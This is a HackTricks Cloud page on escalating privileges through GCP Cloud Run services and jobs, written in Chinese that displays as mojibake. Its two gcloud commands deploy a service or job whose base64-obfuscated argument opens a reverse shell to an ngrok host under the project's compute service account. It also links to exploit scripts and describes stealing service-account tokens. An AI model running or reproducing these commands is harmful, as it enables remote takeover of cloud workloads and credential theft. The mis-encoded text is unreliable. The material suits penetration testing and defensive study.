# GCP - è¿è¡Œæƒé™æå‡

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## run

### `run.services.create` , `iam.serviceAccounts.actAs`

ä¸ _cloudfunctions.functions.create_ æ–¹æ³•ç±»ä¼¼ï¼Œæ­¤æ–¹æ³•åˆ›å»ºä¸€ä¸ª**æ–°çš„ Cloud Run æœåŠ¡**ï¼Œå½“è°ƒç”¨æ—¶ï¼Œé€šè¿‡è®¿é—®å…¶æ‰€åœ¨æœåŠ¡å™¨çš„å…ƒæ•°æ® APIï¼Œè¿”å›**æœåŠ¡è´¦å·çš„**è®¿é—®ä»¤ç‰Œã€‚å¯ä»¥éƒ¨ç½²ä¸€ä¸ª Cloud Run æœåŠ¡ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè¯·æ±‚ä»¥è·å–ä»¤ç‰Œã€‚

æ­¤æ–¹æ³•éœ€è¦ä»¥ä¸‹**æƒé™**ï¼š

* _run.services.create_
* _iam.serviceaccounts.actAs_
* _run.services.setIamPolicy_ **æˆ–** _run.routes.invoke_

![](https://rhinosecuritylabs.com/wp-content/uploads/2020/04/image8-1000x503.png)

æ­¤æ–¹æ³•ä½¿ç”¨ä¸€ä¸ªå¿…é¡»æ„å»ºå’Œæ‰˜ç®¡çš„åŒ…å«çš„ Docker é•œåƒæ¥æ­£ç¡®åˆ©ç”¨ã€‚è¯¥é•œåƒè¢«è®¾è®¡ä¸ºåœ¨æ”¶åˆ° HTTP è¯·æ±‚æ—¶ï¼Œå‘Šè¯‰ Cloud Run ç”¨æœåŠ¡è´¦å·çš„è®¿é—®ä»¤ç‰Œè¿›è¡Œå“åº”ã€‚

æ­¤æ–¹æ³•çš„åˆ©ç”¨è„šæœ¬å¯ä»¥åœ¨[æ­¤å¤„](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/run.services.create.py)æ‰¾åˆ°ï¼ŒDocker é•œåƒå¯ä»¥åœ¨[æ­¤å¤„](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudRunDockerImage)æ‰¾åˆ°ã€‚

ç”±äºæŸç§åŸå› ï¼Œå½“ä½¿ç”¨ `gcloud run deploy` è€Œä¸ä»…ä»…æ˜¯åˆ›å»ºæœåŠ¡æ—¶ï¼Œ**å®ƒéœ€è¦æ›´æ–°æƒé™**ã€‚æŸ¥çœ‹[**æ­¤å¤„çš„ç¤ºä¾‹**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/o-run.services.create.sh)ã€‚

### `run.services.update` , `iam.serviceAccounts.actAs`

ä¸å‰ä¸€ä¸ªæ–¹æ³•ç±»ä¼¼ï¼Œä½†æ˜¯æ›´æ–°æœåŠ¡ã€‚
```bash
gcloud run deploy hacked \
--image=marketplace.gcr.io/google/ubuntu2004 \
--command=bash \
--args="-c,echo c2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTQ4NDEgMD4mMQ== | base64 -d | bash" \
--service-account="<proj-num>-compute@developer.gserviceaccount.com" \
--region=us-central1 \
--allow-unauthenticated
```
### `run.services.setIamPolicy`

ç»™è‡ªå·±èµ‹äºˆä¹‹å‰çš„æƒé™ã€‚

### `run.jobs.create`,`run.jobs.run`,(`run.jobs.get`)

å¯åŠ¨ä¸€ä¸ªå¸¦æœ‰åå‘ shell çš„ä½œä¸šï¼Œä»¥çªƒå–å‘½ä»¤ä¸­æŒ‡å®šçš„æœåŠ¡è´¦å·ã€‚ä½ å¯ä»¥åœ¨[**è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªæ¼æ´**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/m-run.jobs.create.sh)ã€‚

### `run.jobs.update`,`run.jobs.run`,`iam.serviceaccounts.actAs`,(`run.jobs.get`)

ä¸å‰ä¸€ä¸ªç±»ä¼¼ï¼Œå¯ä»¥**æ›´æ–°ä½œä¸šå’Œæ›´æ–°æœåŠ¡è´¦å·**ï¼Œ**æ‰§è¡Œå‘½ä»¤**ã€‚
```bash
gcloud beta run jobs update hacked \
--image=marketplace.gcr.io/google/ubuntu2004 \
--command=bash \
--args="-c,echo c2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTQ4NDEgMD4mMQ== | base64 -d | bash" \
--service-account=<proj-num>-compute@developer.gserviceaccount.com \
--region=us-central1 \
--project=security-devbox --execute-now
```
### `run.jobs.setIamPolicy`

ç»™è‡ªå·±æˆäºˆä¸Šè¿°æƒé™ã€‚

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
